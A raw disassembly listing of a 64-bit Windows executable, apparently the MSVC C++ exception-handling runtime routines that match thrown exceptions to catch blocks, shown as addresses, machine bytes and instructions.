   1400048a3:	44 8b 41 14          	mov    0x14(%rcx),%r8d
   1400048a7:	45 33 c9             	xor    %r9d,%r9d
   1400048aa:	45 85 c0             	test   %r8d,%r8d
   1400048ad:	74 30                	je     0x1400048df
   1400048af:	4b 8d 0c cb          	lea    (%r11,%r9,8),%rcx
   1400048b3:	4a 63 14 11          	movslq (%rcx,%r10,1),%rdx
   1400048b7:	49 03 d2             	add    %r10,%rdx
   1400048ba:	48 3b da             	cmp    %rdx,%rbx
   1400048bd:	72 08                	jb     0x1400048c7
   1400048bf:	41 ff c1             	inc    %r9d
   1400048c2:	45 3b c8             	cmp    %r8d,%r9d
   1400048c5:	72 e8                	jb     0x1400048af
   1400048c7:	45 85 c9             	test   %r9d,%r9d
   1400048ca:	74 13                	je     0x1400048df
   1400048cc:	41 8d 49 ff          	lea    -0x1(%r9),%ecx
   1400048d0:	49 8d 04 ca          	lea    (%r10,%rcx,8),%rax
   1400048d4:	42 8b 44 18 04       	mov    0x4(%rax,%r11,1),%eax
   1400048d9:	48 83 c4 20          	add    $0x20,%rsp
   1400048dd:	5b                   	pop    %rbx
   1400048de:	c3                   	ret
   1400048df:	83 c8 ff             	or     $0xffffffff,%eax
   1400048e2:	eb f5                	jmp    0x1400048d9
   1400048e4:	e8 87 2e 00 00       	call   0x140007770
   1400048e9:	cc                   	int3
   1400048ea:	cc                   	int3
   1400048eb:	cc                   	int3
   1400048ec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400048f1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400048f6:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400048fb:	41 55                	push   %r13
   1400048fd:	41 56                	push   %r14
   1400048ff:	41 57                	push   %r15
   140004901:	48 83 ec 30          	sub    $0x30,%rsp
   140004905:	4d 8b f1             	mov    %r9,%r14
   140004908:	49 8b d8             	mov    %r8,%rbx
   14000490b:	48 8b f2             	mov    %rdx,%rsi
   14000490e:	4c 8b e9             	mov    %rcx,%r13
   140004911:	33 ff                	xor    %edi,%edi
   140004913:	4d 63 78 04          	movslq 0x4(%r8),%r15
   140004917:	45 85 ff             	test   %r15d,%r15d
   14000491a:	74 0b                	je     0x140004927
   14000491c:	e8 df fd ff ff       	call   0x140004700
   140004921:	49 8d 14 07          	lea    (%r15,%rax,1),%rdx
   140004925:	eb 03                	jmp    0x14000492a
   140004927:	48 8b d7             	mov    %rdi,%rdx
   14000492a:	48 85 d2             	test   %rdx,%rdx
   14000492d:	0f 84 6f 01 00 00    	je     0x140004aa2
   140004933:	4c 63 7b 04          	movslq 0x4(%rbx),%r15
   140004937:	45 85 ff             	test   %r15d,%r15d
   14000493a:	74 0b                	je     0x140004947
   14000493c:	e8 bf fd ff ff       	call   0x140004700
   140004941:	49 8d 0c 07          	lea    (%r15,%rax,1),%rcx
   140004945:	eb 03                	jmp    0x14000494a
   140004947:	48 8b cf             	mov    %rdi,%rcx
   14000494a:	40 38 79 10          	cmp    %dil,0x10(%rcx)
   14000494e:	0f 84 4e 01 00 00    	je     0x140004aa2
   140004954:	39 7b 08             	cmp    %edi,0x8(%rbx)
   140004957:	75 08                	jne    0x140004961
   140004959:	39 3b                	cmp    %edi,(%rbx)
   14000495b:	0f 8d 41 01 00 00    	jge    0x140004aa2
   140004961:	39 3b                	cmp    %edi,(%rbx)
   140004963:	7c 0a                	jl     0x14000496f
   140004965:	48 63 43 08          	movslq 0x8(%rbx),%rax
   140004969:	48 03 06             	add    (%rsi),%rax
   14000496c:	48 8b f0             	mov    %rax,%rsi
   14000496f:	f6 03 80             	testb  $0x80,(%rbx)
   140004972:	74 32                	je     0x1400049a6
   140004974:	41 f6 06 10          	testb  $0x10,(%r14)
   140004978:	74 2c                	je     0x1400049a6
   14000497a:	48 8b 05 ff a1 01 00 	mov    0x1a1ff(%rip),%rax        # 0x14001eb80
   140004981:	48 85 c0             	test   %rax,%rax
   140004984:	74 20                	je     0x1400049a6
   140004986:	ff 15 dc e9 00 00    	call   *0xe9dc(%rip)        # 0x140013368
   14000498c:	48 85 c0             	test   %rax,%rax
   14000498f:	0f 84 29 01 00 00    	je     0x140004abe
   140004995:	48 85 f6             	test   %rsi,%rsi
   140004998:	0f 84 20 01 00 00    	je     0x140004abe
   14000499e:	48 89 06             	mov    %rax,(%rsi)
   1400049a1:	48 8b c8             	mov    %rax,%rcx
   1400049a4:	eb 5f                	jmp    0x140004a05
   1400049a6:	f6 03 08             	testb  $0x8,(%rbx)
   1400049a9:	74 1b                	je     0x1400049c6
   1400049ab:	49 8b 4d 28          	mov    0x28(%r13),%rcx
   1400049af:	48 85 c9             	test   %rcx,%rcx
   1400049b2:	0f 84 0b 01 00 00    	je     0x140004ac3
   1400049b8:	48 85 f6             	test   %rsi,%rsi
   1400049bb:	0f 84 02 01 00 00    	je     0x140004ac3
   1400049c1:	48 89 0e             	mov    %rcx,(%rsi)
   1400049c4:	eb 3f                	jmp    0x140004a05
   1400049c6:	41 f6 06 01          	testb  $0x1,(%r14)
   1400049ca:	74 4a                	je     0x140004a16
   1400049cc:	49 8b 55 28          	mov    0x28(%r13),%rdx
   1400049d0:	48 85 d2             	test   %rdx,%rdx
   1400049d3:	0f 84 ef 00 00 00    	je     0x140004ac8
   1400049d9:	48 85 f6             	test   %rsi,%rsi
   1400049dc:	0f 84 e6 00 00 00    	je     0x140004ac8
   1400049e2:	4d 63 46 14          	movslq 0x14(%r14),%r8
   1400049e6:	48 8b ce             	mov    %rsi,%rcx
   1400049e9:	e8 a2 c7 00 00       	call   0x140011190
   1400049ee:	41 83 7e 14 08       	cmpl   $0x8,0x14(%r14)
   1400049f3:	0f 85 a5 00 00 00    	jne    0x140004a9e
   1400049f9:	48 39 3e             	cmp    %rdi,(%rsi)
   1400049fc:	0f 84 9c 00 00 00    	je     0x140004a9e
   140004a02:	48 8b 0e             	mov    (%rsi),%rcx
   140004a05:	49 8d 56 08          	lea    0x8(%r14),%rdx
   140004a09:	e8 be f1 ff ff       	call   0x140003bcc
   140004a0e:	48 89 06             	mov    %rax,(%rsi)
   140004a11:	e9 88 00 00 00       	jmp    0x140004a9e
   140004a16:	49 63 5e 18          	movslq 0x18(%r14),%rbx
   140004a1a:	85 db                	test   %ebx,%ebx
   140004a1c:	74 0b                	je     0x140004a29
   140004a1e:	e8 f1 fc ff ff       	call   0x140004714
   140004a23:	48 8d 0c 03          	lea    (%rbx,%rax,1),%rcx
   140004a27:	eb 03                	jmp    0x140004a2c
   140004a29:	48 8b cf             	mov    %rdi,%rcx
   140004a2c:	48 85 c9             	test   %rcx,%rcx
   140004a2f:	75 34                	jne    0x140004a65
   140004a31:	49 39 7d 28          	cmp    %rdi,0x28(%r13)
   140004a35:	0f 84 92 00 00 00    	je     0x140004acd
   140004a3b:	48 85 f6             	test   %rsi,%rsi
   140004a3e:	0f 84 89 00 00 00    	je     0x140004acd
   140004a44:	49 63 5e 14          	movslq 0x14(%r14),%rbx
   140004a48:	49 8d 56 08          	lea    0x8(%r14),%rdx
   140004a4c:	49 8b 4d 28          	mov    0x28(%r13),%rcx
   140004a50:	e8 77 f1 ff ff       	call   0x140003bcc
   140004a55:	48 8b d0             	mov    %rax,%rdx
   140004a58:	4c 8b c3             	mov    %rbx,%r8
   140004a5b:	48 8b ce             	mov    %rsi,%rcx
   140004a5e:	e8 2d c7 00 00       	call   0x140011190
   140004a63:	eb 39                	jmp    0x140004a9e
   140004a65:	49 39 7d 28          	cmp    %rdi,0x28(%r13)
   140004a69:	74 67                	je     0x140004ad2
   140004a6b:	48 85 f6             	test   %rsi,%rsi
   140004a6e:	74 62                	je     0x140004ad2
   140004a70:	49 63 5e 18          	movslq 0x18(%r14),%rbx
   140004a74:	85 db                	test   %ebx,%ebx
   140004a76:	74 0b                	je     0x140004a83
   140004a78:	e8 97 fc ff ff       	call   0x140004714
   140004a7d:	48 8d 0c 03          	lea    (%rbx,%rax,1),%rcx
   140004a81:	eb 03                	jmp    0x140004a86
   140004a83:	48 8b cf             	mov    %rdi,%rcx
   140004a86:	48 85 c9             	test   %rcx,%rcx
   140004a89:	74 47                	je     0x140004ad2
   140004a8b:	41 8a 06             	mov    (%r14),%al
   140004a8e:	24 04                	and    $0x4,%al
   140004a90:	f6 d8                	neg    %al
   140004a92:	1b c9                	sbb    %ecx,%ecx
   140004a94:	f7 d9                	neg    %ecx
   140004a96:	ff c1                	inc    %ecx
   140004a98:	8b f9                	mov    %ecx,%edi
   140004a9a:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140004a9e:	8b c7                	mov    %edi,%eax
   140004aa0:	eb 02                	jmp    0x140004aa4
   140004aa2:	33 c0                	xor    %eax,%eax
   140004aa4:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140004aa9:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140004aae:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   140004ab3:	48 83 c4 30          	add    $0x30,%rsp
   140004ab7:	41 5f                	pop    %r15
   140004ab9:	41 5e                	pop    %r14
   140004abb:	41 5d                	pop    %r13
   140004abd:	c3                   	ret
   140004abe:	e8 ad 2c 00 00       	call   0x140007770
   140004ac3:	e8 a8 2c 00 00       	call   0x140007770
   140004ac8:	e8 a3 2c 00 00       	call   0x140007770
   140004acd:	e8 9e 2c 00 00       	call   0x140007770
   140004ad2:	e8 99 2c 00 00       	call   0x140007770
   140004ad7:	90                   	nop
   140004ad8:	e8 93 2c 00 00       	call   0x140007770
   140004add:	90                   	nop
   140004ade:	cc                   	int3
   140004adf:	cc                   	int3
   140004ae0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004ae5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140004aea:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140004aef:	41 56                	push   %r14
   140004af1:	48 83 ec 20          	sub    $0x20,%rsp
   140004af5:	49 8b f1             	mov    %r9,%rsi
   140004af8:	4c 8b f1             	mov    %rcx,%r14
   140004afb:	33 db                	xor    %ebx,%ebx
   140004afd:	41 39 18             	cmp    %ebx,(%r8)
   140004b00:	7d 05                	jge    0x140004b07
   140004b02:	48 8b fa             	mov    %rdx,%rdi
   140004b05:	eb 07                	jmp    0x140004b0e
   140004b07:	49 63 78 08          	movslq 0x8(%r8),%rdi
   140004b0b:	48 03 3a             	add    (%rdx),%rdi
   140004b0e:	e8 d9 fd ff ff       	call   0x1400048ec
   140004b13:	83 e8 01             	sub    $0x1,%eax
   140004b16:	74 3c                	je     0x140004b54
   140004b18:	83 f8 01             	cmp    $0x1,%eax
   140004b1b:	75 67                	jne    0x140004b84
   140004b1d:	48 8d 56 08          	lea    0x8(%rsi),%rdx
   140004b21:	49 8b 4e 28          	mov    0x28(%r14),%rcx
   140004b25:	e8 a2 f0 ff ff       	call   0x140003bcc
   140004b2a:	4c 8b f0             	mov    %rax,%r14
   140004b2d:	48 63 76 18          	movslq 0x18(%rsi),%rsi
   140004b31:	85 f6                	test   %esi,%esi
   140004b33:	74 09                	je     0x140004b3e
   140004b35:	e8 da fb ff ff       	call   0x140004714
   140004b3a:	48 8d 1c 30          	lea    (%rax,%rsi,1),%rbx
   140004b3e:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140004b44:	4d 8b c6             	mov    %r14,%r8
   140004b47:	48 8b d3             	mov    %rbx,%rdx
   140004b4a:	48 8b cf             	mov    %rdi,%rcx
   140004b4d:	e8 e2 12 00 00       	call   0x140005e34
   140004b52:	eb 30                	jmp    0x140004b84
   140004b54:	48 8d 56 08          	lea    0x8(%rsi),%rdx
   140004b58:	49 8b 4e 28          	mov    0x28(%r14),%rcx
   140004b5c:	e8 6b f0 ff ff       	call   0x140003bcc
   140004b61:	4c 8b f0             	mov    %rax,%r14
   140004b64:	48 63 76 18          	movslq 0x18(%rsi),%rsi
   140004b68:	85 f6                	test   %esi,%esi
   140004b6a:	74 09                	je     0x140004b75
   140004b6c:	e8 a3 fb ff ff       	call   0x140004714
   140004b71:	48 8d 1c 30          	lea    (%rax,%rsi,1),%rbx
   140004b75:	4d 8b c6             	mov    %r14,%r8
   140004b78:	48 8b d3             	mov    %rbx,%rdx
   140004b7b:	48 8b cf             	mov    %rdi,%rcx
   140004b7e:	e8 a5 12 00 00       	call   0x140005e28
   140004b83:	90                   	nop
   140004b84:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004b89:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140004b8e:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140004b93:	48 83 c4 20          	add    $0x20,%rsp
   140004b97:	41 5e                	pop    %r14
   140004b99:	c3                   	ret
   140004b9a:	e8 d1 2b 00 00       	call   0x140007770
   140004b9f:	90                   	nop
   140004ba0:	48 8b c4             	mov    %rsp,%rax
   140004ba3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140004ba7:	4c 89 40 18          	mov    %r8,0x18(%rax)
   140004bab:	55                   	push   %rbp
   140004bac:	56                   	push   %rsi
   140004bad:	57                   	push   %rdi
   140004bae:	41 54                	push   %r12
   140004bb0:	41 55                	push   %r13
   140004bb2:	41 56                	push   %r14
   140004bb4:	41 57                	push   %r15
   140004bb6:	48 83 ec 60          	sub    $0x60,%rsp
   140004bba:	4c 8b 84 24 c0 00 00 	mov    0xc0(%rsp),%r8
   140004bc1:	00 
   140004bc2:	4d 8b e1             	mov    %r9,%r12
   140004bc5:	4c 8b ea             	mov    %rdx,%r13
   140004bc8:	4c 8d 48 10          	lea    0x10(%rax),%r9
   140004bcc:	4c 8b f1             	mov    %rcx,%r14
   140004bcf:	49 8b d4             	mov    %r12,%rdx
   140004bd2:	49 8b cd             	mov    %r13,%rcx
   140004bd5:	e8 72 f7 ff ff       	call   0x14000434c
   140004bda:	4c 8b 8c 24 d0 00 00 	mov    0xd0(%rsp),%r9
   140004be1:	00 
   140004be2:	4c 8b f8             	mov    %rax,%r15
   140004be5:	48 8b ac 24 c8 00 00 	mov    0xc8(%rsp),%rbp
   140004bec:	00 
   140004bed:	4d 85 c9             	test   %r9,%r9
   140004bf0:	74 0e                	je     0x140004c00
   140004bf2:	4c 8b c5             	mov    %rbp,%r8
   140004bf5:	48 8b d0             	mov    %rax,%rdx
   140004bf8:	49 8b ce             	mov    %r14,%rcx
   140004bfb:	e8 e0 fe ff ff       	call   0x140004ae0
   140004c00:	48 8b 8c 24 d8 00 00 	mov    0xd8(%rsp),%rcx
   140004c07:	00 
   140004c08:	48 63 5d 0c          	movslq 0xc(%rbp),%rbx
   140004c0c:	8b 79 08             	mov    0x8(%rcx),%edi
   140004c0f:	8b 31                	mov    (%rcx),%esi
   140004c11:	e8 ea fa ff ff       	call   0x140004700
   140004c16:	8a 8c 24 f8 00 00 00 	mov    0xf8(%rsp),%cl
   140004c1d:	48 03 c3             	add    %rbx,%rax
   140004c20:	4c 8b 84 24 b0 00 00 	mov    0xb0(%rsp),%r8
   140004c27:	00 
   140004c28:	4d 8b cf             	mov    %r15,%r9
   140004c2b:	88 4c 24 50          	mov    %cl,0x50(%rsp)
   140004c2f:	49 8b d6             	mov    %r14,%rdx
   140004c32:	48 8b 8c 24 c0 00 00 	mov    0xc0(%rsp),%rcx
   140004c39:	00 
   140004c3a:	4c 89 64 24 48       	mov    %r12,0x48(%rsp)
   140004c3f:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   140004c44:	89 7c 24 38          	mov    %edi,0x38(%rsp)
   140004c48:	89 74 24 30          	mov    %esi,0x30(%rsp)
   140004c4c:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140004c51:	49 8b cd             	mov    %r13,%rcx
   140004c54:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004c59:	e8 0e f9 ff ff       	call   0x14000456c
   140004c5e:	48 8b 9c 24 a0 00 00 	mov    0xa0(%rsp),%rbx
   140004c65:	00 
   140004c66:	48 83 c4 60          	add    $0x60,%rsp
   140004c6a:	41 5f                	pop    %r15
   140004c6c:	41 5e                	pop    %r14
   140004c6e:	41 5d                	pop    %r13
   140004c70:	41 5c                	pop    %r12
   140004c72:	5f                   	pop    %rdi
   140004c73:	5e                   	pop    %rsi
   140004c74:	5d                   	pop    %rbp
   140004c75:	c3                   	ret
   140004c76:	cc                   	int3
   140004c77:	cc                   	int3
   140004c78:	40 55                	rex push %rbp
   140004c7a:	53                   	push   %rbx
   140004c7b:	56                   	push   %rsi
   140004c7c:	57                   	push   %rdi
   140004c7d:	41 54                	push   %r12
   140004c7f:	41 55                	push   %r13
   140004c81:	41 56                	push   %r14
   140004c83:	41 57                	push   %r15
   140004c85:	48 8d 6c 24 d8       	lea    -0x28(%rsp),%rbp
   140004c8a:	48 81 ec 28 01 00 00 	sub    $0x128,%rsp
   140004c91:	48 8b 05 a8 93 01 00 	mov    0x193a8(%rip),%rax        # 0x14001e040
   140004c98:	48 33 c4             	xor    %rsp,%rax
   140004c9b:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140004c9f:	48 8b b5 90 00 00 00 	mov    0x90(%rbp),%rsi
   140004ca6:	4c 8b e2             	mov    %rdx,%r12
   140004ca9:	4c 8b ad a8 00 00 00 	mov    0xa8(%rbp),%r13
   140004cb0:	4d 8b f8             	mov    %r8,%r15
   140004cb3:	4c 89 44 24 68       	mov    %r8,0x68(%rsp)
   140004cb8:	48 8b f9             	mov    %rcx,%rdi
   140004cbb:	48 89 54 24 78       	mov    %rdx,0x78(%rsp)
   140004cc0:	4c 8b c6             	mov    %rsi,%r8
   140004cc3:	49 8b cc             	mov    %r12,%rcx
   140004cc6:	4c 89 6d 88          	mov    %r13,-0x78(%rbp)
   140004cca:	49 8b d1             	mov    %r9,%rdx
   140004ccd:	c6 44 24 60 00       	movb   $0x0,0x60(%rsp)
   140004cd2:	4d 8b f1             	mov    %r9,%r14
   140004cd5:	e8 46 0f 00 00       	call   0x140005c20
   140004cda:	89 44 24 64          	mov    %eax,0x64(%rsp)
   140004cde:	8b d8                	mov    %eax,%ebx
   140004ce0:	83 f8 ff             	cmp    $0xffffffff,%eax
   140004ce3:	0f 8c 78 04 00 00    	jl     0x140005161
   140004ce9:	3b 46 04             	cmp    0x4(%rsi),%eax
   140004cec:	0f 8d 6f 04 00 00    	jge    0x140005161
   140004cf2:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   140004cf8:	0f 85 e2 00 00 00    	jne    0x140004de0
   140004cfe:	83 7f 18 04          	cmpl   $0x4,0x18(%rdi)
   140004d02:	0f 85 d8 00 00 00    	jne    0x140004de0
   140004d08:	8b 47 20             	mov    0x20(%rdi),%eax
   140004d0b:	3d 20 05 93 19       	cmp    $0x19930520,%eax
   140004d10:	74 0e                	je     0x140004d20
   140004d12:	05 df fa 6c e6       	add    $0xe66cfadf,%eax
   140004d17:	83 f8 01             	cmp    $0x1,%eax
   140004d1a:	0f 87 c0 00 00 00    	ja     0x140004de0
   140004d20:	48 83 7f 30 00       	cmpq   $0x0,0x30(%rdi)
   140004d25:	0f 85 b5 00 00 00    	jne    0x140004de0
   140004d2b:	e8 1c f0 ff ff       	call   0x140003d4c
   140004d30:	48 83 78 20 00       	cmpq   $0x0,0x20(%rax)
   140004d35:	0f 84 bf 03 00 00    	je     0x1400050fa
   140004d3b:	e8 0c f0 ff ff       	call   0x140003d4c
   140004d40:	48 8b 78 20          	mov    0x20(%rax),%rdi
   140004d44:	e8 03 f0 ff ff       	call   0x140003d4c
   140004d49:	48 8b 4f 38          	mov    0x38(%rdi),%rcx
   140004d4d:	c6 44 24 60 01       	movb   $0x1,0x60(%rsp)
   140004d52:	4c 8b 78 28          	mov    0x28(%rax),%r15
   140004d56:	4c 89 7c 24 68       	mov    %r15,0x68(%rsp)
   140004d5b:	e8 e0 f9 ff ff       	call   0x140004740
   140004d60:	48 85 ff             	test   %rdi,%rdi
   140004d63:	0f 84 f8 03 00 00    	je     0x140005161
   140004d69:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   140004d6f:	75 25                	jne    0x140004d96
   140004d71:	83 7f 18 04          	cmpl   $0x4,0x18(%rdi)
   140004d75:	75 1f                	jne    0x140004d96
   140004d77:	8b 47 20             	mov    0x20(%rdi),%eax
   140004d7a:	3d 20 05 93 19       	cmp    $0x19930520,%eax
   140004d7f:	74 0a                	je     0x140004d8b
   140004d81:	05 df fa 6c e6       	add    $0xe66cfadf,%eax
   140004d86:	83 f8 01             	cmp    $0x1,%eax
   140004d89:	77 0b                	ja     0x140004d96
   140004d8b:	48 83 7f 30 00       	cmpq   $0x0,0x30(%rdi)
   140004d90:	0f 84 cb 03 00 00    	je     0x140005161
   140004d96:	e8 b1 ef ff ff       	call   0x140003d4c
   140004d9b:	48 83 78 38 00       	cmpq   $0x0,0x38(%rax)
   140004da0:	74 3e                	je     0x140004de0
   140004da2:	e8 a5 ef ff ff       	call   0x140003d4c
   140004da7:	48 8b 58 38          	mov    0x38(%rax),%rbx
   140004dab:	e8 9c ef ff ff       	call   0x140003d4c
   140004db0:	48 8b d3             	mov    %rbx,%rdx
   140004db3:	48 8b cf             	mov    %rdi,%rcx
   140004db6:	48 c7 40 38 00 00 00 	movq   $0x0,0x38(%rax)
   140004dbd:	00 
   140004dbe:	e8 f5 0e 00 00       	call   0x140005cb8
   140004dc3:	84 c0                	test   %al,%al
   140004dc5:	75 15                	jne    0x140004ddc
   140004dc7:	48 8b cb             	mov    %rbx,%rcx
   140004dca:	e8 d1 0f 00 00       	call   0x140005da0
   140004dcf:	84 c0                	test   %al,%al
   140004dd1:	0f 84 67 03 00 00    	je     0x14000513e
   140004dd7:	e9 3e 03 00 00       	jmp    0x14000511a
   140004ddc:	8b 5c 24 64          	mov    0x64(%rsp),%ebx
   140004de0:	49 8b 46 08          	mov    0x8(%r14),%rax
   140004de4:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
   140004de8:	48 89 75 b8          	mov    %rsi,-0x48(%rbp)
   140004dec:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   140004df2:	0f 85 ba 02 00 00    	jne    0x1400050b2
   140004df8:	83 7f 18 04          	cmpl   $0x4,0x18(%rdi)
   140004dfc:	0f 85 b0 02 00 00    	jne    0x1400050b2
   140004e02:	8b 47 20             	mov    0x20(%rdi),%eax
   140004e05:	3d 20 05 93 19       	cmp    $0x19930520,%eax
   140004e0a:	74 0e                	je     0x140004e1a
   140004e0c:	05 df fa 6c e6       	add    $0xe66cfadf,%eax
   140004e11:	83 f8 01             	cmp    $0x1,%eax
   140004e14:	0f 87 98 02 00 00    	ja     0x1400050b2
   140004e1a:	83 7e 0c 00          	cmpl   $0x0,0xc(%rsi)
   140004e1e:	0f 86 c6 01 00 00    	jbe    0x140004fea
   140004e24:	8b 85 a0 00 00 00    	mov    0xa0(%rbp),%eax
   140004e2a:	48 8d 55 b8          	lea    -0x48(%rbp),%rdx
   140004e2e:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140004e32:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   140004e36:	4d 8b ce             	mov    %r14,%r9
   140004e39:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004e3e:	44 8b c3             	mov    %ebx,%r8d
   140004e41:	e8 ee f5 ff ff       	call   0x140004434
   140004e46:	0f 10 4d d8          	movups -0x28(%rbp),%xmm1
   140004e4a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   140004e4e:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   140004e53:	66 0f 7e c0          	movd   %xmm0,%eax
   140004e57:	f3 0f 7f 4d c8       	movdqu %xmm1,-0x38(%rbp)
   140004e5c:	3b 45 f0             	cmp    -0x10(%rbp),%eax
   140004e5f:	0f 83 85 01 00 00    	jae    0x140004fea
   140004e65:	44 8b 7d d0          	mov    -0x30(%rbp),%r15d
   140004e69:	66 49 0f 7e c9       	movq   %xmm1,%r9
   140004e6e:	4c 89 4d 80          	mov    %r9,-0x80(%rbp)
   140004e72:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
   140004e76:	48 8b 00             	mov    (%rax),%rax
   140004e79:	48 63 50 10          	movslq 0x10(%rax),%rdx
   140004e7d:	41 8b c7             	mov    %r15d,%eax
   140004e80:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140004e84:	49 8b 41 08          	mov    0x8(%r9),%rax
   140004e88:	4c 8d 04 8a          	lea    (%rdx,%rcx,4),%r8
   140004e8c:	41 0f 10 04 00       	movups (%r8,%rax,1),%xmm0
   140004e91:	49 63 4c 00 10       	movslq 0x10(%r8,%rax,1),%rcx
   140004e96:	89 4d b0             	mov    %ecx,-0x50(%rbp)
   140004e99:	66 0f 7e c0          	movd   %xmm0,%eax
   140004e9d:	0f 11 45 a0          	movups %xmm0,-0x60(%rbp)
   140004ea1:	3b c3                	cmp    %ebx,%eax
   140004ea3:	0f 8f 34 01 00 00    	jg     0x140004fdd
   140004ea9:	66 48 0f 7e c0       	movq   %xmm0,%rax
   140004eae:	48 c1 e8 20          	shr    $0x20,%rax
   140004eb2:	3b d8                	cmp    %eax,%ebx
   140004eb4:	0f 8f 23 01 00 00    	jg     0x140004fdd
   140004eba:	49 03 4e 08          	add    0x8(%r14),%rcx
   140004ebe:	45 33 e4             	xor    %r12d,%r12d
   140004ec1:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   140004ec6:	66 48 0f 7e c0       	movq   %xmm0,%rax
   140004ecb:	48 89 4d 98          	mov    %rcx,-0x68(%rbp)
   140004ecf:	48 c1 e8 20          	shr    $0x20,%rax
   140004ed3:	48 89 45 90          	mov    %rax,-0x70(%rbp)
   140004ed7:	85 c0                	test   %eax,%eax
   140004ed9:	0f 84 f9 00 00 00    	je     0x140004fd8
   140004edf:	4b 8d 04 a4          	lea    (%r12,%r12,4),%rax
   140004ee3:	0f 10 04 81          	movups (%rcx,%rax,4),%xmm0
   140004ee7:	0f 11 45 f8          	movups %xmm0,-0x8(%rbp)
   140004eeb:	8b 44 81 10          	mov    0x10(%rcx,%rax,4),%eax
   140004eef:	89 45 08             	mov    %eax,0x8(%rbp)
   140004ef2:	48 8b 47 30          	mov    0x30(%rdi),%rax
   140004ef6:	48 63 58 0c          	movslq 0xc(%rax),%rbx
   140004efa:	e8 15 f8 ff ff       	call   0x140004714
   140004eff:	48 8d 48 04          	lea    0x4(%rax),%rcx
   140004f03:	48 8b 47 30          	mov    0x30(%rdi),%rax
   140004f07:	48 03 cb             	add    %rbx,%rcx
   140004f0a:	48 89 4c 24 70       	mov    %rcx,0x70(%rsp)
   140004f0f:	48 63 58 0c          	movslq 0xc(%rax),%rbx
   140004f13:	e8 fc f7 ff ff       	call   0x140004714
   140004f18:	44 8b 2c 18          	mov    (%rax,%rbx,1),%r13d
   140004f1c:	45 85 ed             	test   %r13d,%r13d
   140004f1f:	7e 3a                	jle    0x140004f5b
   140004f21:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140004f26:	48 63 18             	movslq (%rax),%rbx
   140004f29:	e8 e6 f7 ff ff       	call   0x140004714
   140004f2e:	4c 8b 47 30          	mov    0x30(%rdi),%r8
   140004f32:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
   140004f36:	48 03 d8             	add    %rax,%rbx
   140004f39:	48 8b d3             	mov    %rbx,%rdx
   140004f3c:	e8 8b 04 00 00       	call   0x1400053cc
   140004f41:	85 c0                	test   %eax,%eax
   140004f43:	75 28                	jne    0x140004f6d
   140004f45:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140004f4a:	41 ff cd             	dec    %r13d
   140004f4d:	48 83 c0 04          	add    $0x4,%rax
   140004f51:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140004f56:	45 85 ed             	test   %r13d,%r13d
   140004f59:	7f cb                	jg     0x140004f26
   140004f5b:	41 ff c4             	inc    %r12d
   140004f5e:	44 3b 65 90          	cmp    -0x70(%rbp),%r12d
   140004f62:	74 6c                	je     0x140004fd0
   140004f64:	48 8b 4d 98          	mov    -0x68(%rbp),%rcx
   140004f68:	e9 72 ff ff ff       	jmp    0x140004edf
   140004f6d:	8a 85 98 00 00 00    	mov    0x98(%rbp),%al
   140004f73:	4d 8b ce             	mov    %r14,%r9
   140004f76:	4c 8b 64 24 78       	mov    0x78(%rsp),%r12
   140004f7b:	48 8b cf             	mov    %rdi,%rcx
   140004f7e:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   140004f83:	49 8b d4             	mov    %r12,%rdx
   140004f86:	88 44 24 58          	mov    %al,0x58(%rsp)
   140004f8a:	8a 44 24 60          	mov    0x60(%rsp),%al
   140004f8e:	88 44 24 50          	mov    %al,0x50(%rsp)
   140004f92:	48 8b 45 88          	mov    -0x78(%rbp),%rax
   140004f96:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140004f9b:	8b 85 a0 00 00 00    	mov    0xa0(%rbp),%eax
   140004fa1:	89 44 24 40          	mov    %eax,0x40(%rsp)
   140004fa5:	48 8d 45 a0          	lea    -0x60(%rbp),%rax
   140004fa9:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
